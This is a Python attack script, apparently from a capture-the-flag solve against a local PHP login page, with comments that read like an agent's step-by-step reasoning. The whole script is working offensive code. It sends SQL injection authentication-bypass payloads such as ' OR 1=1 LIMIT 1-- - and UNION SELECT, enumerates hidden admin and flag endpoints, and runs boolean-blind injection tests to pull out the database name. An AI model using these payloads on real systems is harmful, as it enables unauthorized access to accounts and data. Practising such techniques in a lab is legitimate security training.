import requests
import re
import string

target = "http://127.0.0.1:32895/index.php"

print("[*] Final attempt: Testing if blind SQLi works with a different approach\n")
print("Theory: Maybe the response IS different but only in specific cases\n")

# Maybe the message changes ONLY when we successfully authenticate AS admin
# Let's try: admin' OR (username='admin' AND is_admin=1)-- -

admin_specific_payloads = [
    "admin' OR (username='admin')-- -",
    "admin' OR 1=1 LIMIT 1-- -",
    "admin' UNION SELECT * FROM users WHERE username='admin'-- -",
    "' OR username='admin'-- -",
    "' OR username='admin' AND is_admin=1-- -",
    "' OR 1=1 LIMIT 0,1-- -",
]

print("[1] Testing admin-specific bypass payloads:")
for payload in admin_specific_payloads:
    r = requests.get(target, params={'username': payload, 'password': 'x'})
    
    # Extract message
    msg = "No message"
    msg_match = re.search(r'<h3>(.*?)</h3>', r.text)
    if msg_match:
        msg = msg_match.group(1)
    
    print(f"  Payload: {payload[:50]}")
    print(f"    Length: {len(r.text)} | Message: {msg}")
    
    if 'FLAG{' in r.text:
        flags = re.findall(r'FLAG\{[^}]+\}', r.text)
        print(f"    [!!!] FLAG: {flags[0]}")
        print(f"\nFull response:\n{r.text}\n")
        break
    elif msg != "Oh Sorry but...you are not the admin :(" and msg != "No message":
        print(f"    [!] DIFFERENT MESSAGE!")
        print(f"    Full response:\n{r.text}\n")
    print()

# Maybe there's a second page after login
print("\n[2] Checking for other pages/endpoints:")
endpoints = [
    "/dashboard.php",
    "/admin.php",
    "/profile.php",
    "/flag.php",
    "/user.php",
    "/home.php",
]

for endpoint in endpoints:
    try:
        r = requests.get(f"http://127.0.0.1:32895{endpoint}", timeout=2)
        if r.status_code == 200:
            print(f"  {endpoint}: EXISTS (Length: {len(r.text)})")
            if 'FLAG{' in r.text:
                flags = re.findall(r'FLAG\{[^}]+\}', r.text)
                print(f"    [!!!] FLAG: {flags[0]}")
    except:
        pass

print("\n[3] One more attempt at boolean blind - testing character extraction:")
# Maybe boolean works but I need to test it differently
# Let me try a very simple test: Does first char of database = 'a'?

def test_condition_alternate(cond):
    # Try different injection points
    payloads = [
        f"admin' AND ({cond})-- -",
        f"admin' AND ({cond}) AND '1'='1'-- -",
        f"' OR ({cond})-- -",
    ]
    
    for p in payloads:
        r = requests.get(target, params={'username': p, 'password': 'x'})
        # Maybe check for absence of "not the admin" instead?
        if 'not the admin' not in r.text:
            return True, p
        if len(r.text) != 3173:
            return True, p
    
    return False, None

# Test if we can detect ANY difference
print("\n  Testing basic conditions:")
tests = [
    ("1=1", "Always true"),
    ("1=0", "Always false"),
    ("DATABASE()='mysql'", "DB name test"),
]

for cond, desc in tests:
    result, payload = test_condition_alternate(cond)
    print(f"    [{desc}] {cond}: Detectable={result}")
    if result and payload:
        print(f"      Working payload: {payload}")

